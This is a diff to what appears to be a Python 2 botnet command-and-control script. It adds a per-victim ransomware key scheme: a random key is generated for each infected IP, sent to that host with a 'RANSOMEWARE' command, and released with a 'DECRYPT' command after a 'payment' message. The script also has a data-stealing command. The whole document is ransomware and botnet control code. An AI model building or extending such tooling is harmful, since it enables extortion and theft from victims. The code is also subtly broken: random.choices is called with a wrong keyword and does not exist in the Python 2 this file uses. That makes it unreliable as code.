@@ -7,6 +7,7 @@ from time import sleep
 LISTEN_PORT = 3838
 VICTIM_PORT = 4848
 
+keys = {}
 
 def send_steal_attack(payload):
     infected_ip = str(payload.split(",")[1])
@@ -19,7 +20,11 @@ def send_steal_attack(payload):
 def ransomeware_attack(payload):
     print "Beginning Ransomeware Attack"
     infected_ip = str(payload.split(",")[1])
-    msg_contents = "RANSOMEWARE,"
+    if infected_ip in keys:
+        return # already attacked
+    key = ''.join(random.choices(string.ascii_lowercase, n=16))
+    keys[infected_ip] = key
+    msg_contents = "RANSOMEWARE," + key
     Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
     print "Encypted Files"
 
@@ -28,7 +33,9 @@ def send_decrypt_key(payload):
     print "Receieved Payment"
     print "Sending Key to unencrypt files"
     infected_ip = str(payload.split(",")[1])
-    msg_contents = "DECRYPT"
+    if infected_ip not in keys:
+        return # did not attack yet
+    msg_contents = "DECRYPT," + keys[infected_ip]
     Messenger.send_message(str(infected_ip), VICTIM_PORT, msg_contents)
 
 
@@ -80,13 +87,13 @@ def quit_all():
 
 def main():
     global botnet
-    botnet = ["127.0.0.1"]
+    botnet = []
 
     listen_thread = Thread(None, listen_for_response,)
     listen_thread.start()
 
     while True:
-        command = str(raw_input("Enter a command to run: ")).replace(" ", "")
+        command = str(raw_input("Enter a command to run: ")).strip()
         try:
             if len(command) == 4:
                 # Either a LIST or EXIT command
